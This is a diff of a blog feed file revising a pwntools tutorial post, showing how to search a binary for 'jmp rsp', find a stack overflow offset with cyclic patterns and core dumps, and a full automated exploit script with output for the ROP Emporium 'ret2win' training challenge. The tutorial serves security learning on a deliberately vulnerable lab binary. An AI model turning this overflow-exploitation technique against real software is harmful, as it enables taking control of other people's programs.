@@ -14,28 +14,28 @@
             <pubDate>Sat, 04 Jan 2020 19:13:37 -0500</pubDate>
             
             <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-3/</guid>
-            <description>Before we start, in part 2 of the series, I demonstrated finding instructions within a binary using elf.search. I passed &amp;quot;\xff\e4&amp;quot; in order to find the address of some jmp rsp instructions. Turns out, just can also use the mnemonics if we pass them through asm() first.
-&amp;#34;&amp;#34;&amp;#34;From yesterday &amp;#34;&amp;#34;&amp;#34; In [2]: e = ELF(&amp;#39;pwnable&amp;#39;) In [3]: next(e.search(&amp;#34;\xff\xe4&amp;#34;)) Out[3]: 159281 &amp;#34;&amp;#34;&amp;#34;Alternate way, with mnenonic &amp;#34;&amp;#34;&amp;#34; In [2]: searcher = e.search( asm(&amp;#34;jmp rsp&amp;#34;) ) In [3]: searcher.</description>
-            <content type="html"><![CDATA[<p>Before we start, in part 2 of the series, I demonstrated  finding instructions within a binary
-using <code>elf.search</code>. I passed <code>&quot;\xff\e4&quot;</code> in order to find the address of some <code>jmp rsp</code>
-instructions. Turns out, just can also use the mnemonics if we pass them through <code>asm()</code> first.</p>
+            <description>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary using the elf.search() function. We passed bytes ff e4 in order to find the address of a jmp rsp instruction. As it turns out, we can use also the mnemonic if we pass it through asm() first. This way, we don&#39;t have to remember that jmp rsp is ff e4 on amd64 architecture.</description>
+            <content type="html"><![CDATA[<p>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary
+using the <code>elf.search()</code> function. We passed bytes <code>ff e4</code> in order to find the address of a <code>jmp rsp</code> instruction. As it turns out, we can use also the mnemonic if we pass it through <code>asm()</code> first.
+This way, we don't have to remember that <code>jmp rsp</code> is <code>ff e4</code> on amd64 architecture.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
 <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> From yesterday </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
 In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)
 In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#ae81ff">\xe4</span><span style="color:#e6db74">&#34;</span>))
 Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
 
-<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> Alternate way, with mnenonic </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-In [<span style="color:#ae81ff">2</span>]: searcher <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>search( asm(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">jmp rsp</span><span style="color:#e6db74">&#34;</span>) )
-In [<span style="color:#ae81ff">3</span>]: searcher<span style="color:#f92672">.</span>next()
-Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> Alternate way, with the mnenonic </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+In [<span style="color:#ae81ff">3</span>]: searcher <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>search( asm(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">jmp rsp</span><span style="color:#e6db74">&#34;</span>) )
+In [<span style="color:#ae81ff">4</span>]: searcher<span style="color:#f92672">.</span>next()
+Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">159281</span>
 
 
-</code></pre></div><h1 id="autofind-your-offset-with-cyclic-and-corefiles">Auto-Find Your Offset with Cyclic and Corefiles</h1>
+</code></pre></div><h1 id="autofinding-the-offset-with-cyclic--corefiles">Auto-Finding the Offset with Cyclic &amp; Corefiles</h1>
 <p>The <code>cyclic</code> function will generate a deterministic sequence called a
 <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn</a>
-sequence. Since the pattern is always the same, we can take the sequence at the fault address and
-search for the offset within that sequence.</p>
+sequence. Since the pattern is always the same, we can rely on the fact that any subsequence will
+also be at the same index. That means we can take the sequence at the fault address and search for
+the offset within that sequence. Searching is done with the <code>cyclic_find</code> function.</p>
 <p><code>Pwntools</code> also knows how to deal with core dumps.</p>
 <p>From the <a href="http://docs.pwntools.com/en/stable/elf/corefile.html#using-corefiles-to-automate-exploitation">Docs</a>:</p>
 <blockquote>
@@ -43,51 +43,50 @@ search for the offset within that sequence.</p>
 </blockquote>
 <p>We're going use the first 64-bit challenge from
 <a href="https://ropemporium.com/challenge/ret2win.html">ROP Emporium</a>.
-The challenges here are specifically geared toward practicing ROP techniques, so they tell you
-outright that the overflow length for every challenge is 40. We'll use the known-good value to
-test with.</p>
+The challenges here are specifically geared toward practicing ROP techniques, so they remove most
+reversing and bug-hunting barriers and tell you outright that the overflow length for every
+challenge is 40. As a former teacher, I approve of this method. We'll use this known-good value of
+40 to test with.</p>
 <p>To automatically find the offset:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>)
 In [<span style="color:#ae81ff">3</span>]: io <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ret2win</span><span style="color:#e6db74">&#39;</span>)
-In [<span style="color:#ae81ff">4</span>]: prompt <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
-In [<span style="color:#ae81ff">5</span>]: io<span style="color:#f92672">.</span>sendline(cyclic(<span style="color:#ae81ff">128</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+In [<span style="color:#ae81ff">4</span>]: io<span style="color:#f92672">.</span>recv()
+In [<span style="color:#ae81ff">5</span>]: io<span style="color:#f92672">.</span>sendline( cyclic(<span style="color:#ae81ff">128</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
 In [<span style="color:#ae81ff">6</span>]: io<span style="color:#f92672">.</span>wait()
 [<span style="color:#f92672">*</span>] Process <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ret2win</span><span style="color:#e6db74">&#39;</span> stopped <span style="color:#66d9ef">with</span> exit code <span style="color:#f92672">-</span><span style="color:#ae81ff">11</span> (SIGSEGV) (pid <span style="color:#ae81ff">1108287</span>)
 
-In [<span style="color:#ae81ff">7</span>]: c <span style="color:#f92672">=</span> Core(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./core.ret2win.1108287</span><span style="color:#e6db74">&#34;</span>)
+In [<span style="color:#ae81ff">7</span>]: coredump <span style="color:#f92672">=</span> Core(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./core.ret2win.1108287</span><span style="color:#e6db74">&#34;</span>)
 [x] Parsing corefile<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
     Arch:      amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
     RIP:       <span style="color:#ae81ff">0x400810</span>
     RSP:       <span style="color:#ae81ff">0x7ffcef76b438</span>
     Fault:     <span style="color:#ae81ff">0x6161616161616166</span>
 
-In [<span style="color:#ae81ff">8</span>]: cyclic_find(c<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
+In [<span style="color:#ae81ff">8</span>]: cyclic_find(coredump<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
 Out[<span style="color:#ae81ff">8</span>]: <span style="color:#ae81ff">40</span>
 </code></pre></div><p>Here's what a fully automated exploit might look like using what we've learned from the past 3
 posts.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">overflow</span>(io, data):
     io<span style="color:#f92672">.</span>recv()
     io<span style="color:#f92672">.</span>sendline(data)
 
 exe <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ret2win</span><span style="color:#e6db74">&#34;</span>
-context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>
-io <span style="color:#f92672">=</span> process(exe)
+io  <span style="color:#f92672">=</span> process(exe)
 
-pattern <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
-overflow(io, pattern)
+overflow( io, cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>) )
 io<span style="color:#f92672">.</span>wait()
 
-offset <span style="color:#f92672">=</span> cyclic_find( io<span style="color:#f92672">.</span>corefile<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
-
-elf <span style="color:#f92672">=</span> ELF(exe)
-payload <span style="color:#f92672">=</span> fit({ offset: elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>ret2win })
+elf_file <span style="color:#f92672">=</span> ELF(exe)
+offset   <span style="color:#f92672">=</span> cyclic_find( io<span style="color:#f92672">.</span>corefile<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
+payload  <span style="color:#f92672">=</span> fit({ offset: elf_file<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>ret2win })
 
 io <span style="color:#f92672">=</span> process(exe)
 overflow(io, payload)
-success( io<span style="color:#f92672">.</span>recvline()  )
+success( io<span style="color:#f92672">.</span>recvline() )
 </code></pre></div><p>Output:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">dev ❯❯ python exp.py
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248672</span>
@@ -99,7 +98,8 @@ success( io<span style="color:#f92672">.</span>recvline()  )
     Fault:     0x6161616161616166
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248677</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> b<span style="color:#e6db74">&#34;Thank you! Here&#39;s your flag:ROPE{a_placeholder_32byte_flag!}\n&#34;</span>
-</code></pre></div>]]></content>
+</code></pre></div><p>Check out the <code>cyclic</code> <a href="http://docs.pwntools.com/en/stable/util/cyclic.html">docs here</a></p>
+]]></content>
         </item>
         
         <item>
